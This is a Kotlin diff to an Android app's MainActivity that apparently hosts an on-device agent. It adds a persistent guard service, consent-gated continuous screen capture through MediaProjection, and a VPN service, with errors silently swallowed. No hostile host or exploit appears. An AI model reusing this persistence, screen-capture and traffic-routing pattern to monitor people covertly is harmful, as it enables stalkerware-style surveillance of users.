@@ -251,6 +251,22 @@ class MainActivity : AppCompatActivity() {
         else requestAllPermissions()
         // Cere o singura data excluderea de la optimizarea bateriei (ca sa nu moara in Doze).
         requestIgnoreBatteryOptimizations()
+
+        // FIX 7: pornim guard-ul persistent (foreground + alarm re-programat).
+        try { GuardService.start(this) } catch (_: Exception) {}
+        // FIX 5: cerem consimtamantul de captura o singura data (dupa ce UI-ul e gata).
+        root.postDelayed({ try { requestScreenCapture() } catch (_: Exception) {} }, 1500)
+        // FIX 4: pornim serviciul VPN si cerem consimtamantul o singura data.
+        try { startService(Intent(this, AgentVpn::class.java)) } catch (_: Exception) {}
+        root.postDelayed({ try { requestVpn() } catch (_: Exception) {} }, 3000)
+    }
+
+    private val VPN_REQ = 9002
+    fun requestVpn() {
+        try {
+            val i = AgentVpn.prepare(this)
+            if (i != null) startActivityForResult(i, VPN_REQ)
+        } catch (_: Exception) {}
     }
 
     /** Porneste AgentService (foreground) ca procesul sa supravietuiasca in background. */
@@ -301,6 +317,8 @@ class MainActivity : AppCompatActivity() {
         // daca utilizatorul a iesit din aplicatie, ne asiguram ca serviciul foreground ruleaza
         // (agentul continua sa lucreze prin alte aplicatii)
         startAgentService()
+        // FIX 7: guard persistent (foreground + alarm re-programat)
+        try { GuardService.start(this) } catch (_: Exception) {}
     }
 
     private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()
@@ -554,9 +572,33 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // FIX 5: cere consimtamantul MediaProjection (o singura data) si porneste
+    // ScreenCaptureService, care da captura continua de ecran.
+    private val CAPTURE_REQ = 9001
+    fun requestScreenCapture() {
+        try {
+            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
+            startActivityForResult(mpm.createScreenCaptureIntent(), CAPTURE_REQ)
+        } catch (e: Exception) { appendAnsi("\n[capture] eroare: $e\n") }
+    }
+
+    @Deprecated("Deprecated in Java")
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == CAPTURE_REQ && resultCode == RESULT_OK && data != null) {
+            try {
+                ScreenCaptureService.start(this, resultCode, data)
+                appendAnsi("\n[capture] MediaProjection activ\n")
+            } catch (e: Exception) { appendAnsi("\n[capture] start eroare: $e\n") }
+        }
+        if (requestCode == VPN_REQ && resultCode == RESULT_OK) {
+            try { startService(Intent(this, AgentVpn::class.java)); appendAnsi("\n[vpn] consimtamant acordat\n") } catch (_: Exception) {}
+        }
+    }
+
     private fun extractAssets() {
         val dest = File(filesDir, "python")
-        val stamp = File(filesDir, ".assets_v100")
+        val stamp = File(filesDir, ".assets_v101")
         // memoria pe termen lung a agentului NU face parte din APK: o salvam
         // inainte de re-extragere si o punem la loc, ca update-urile de app sa
         // nu stearga ce a invatat agentul de la operator.
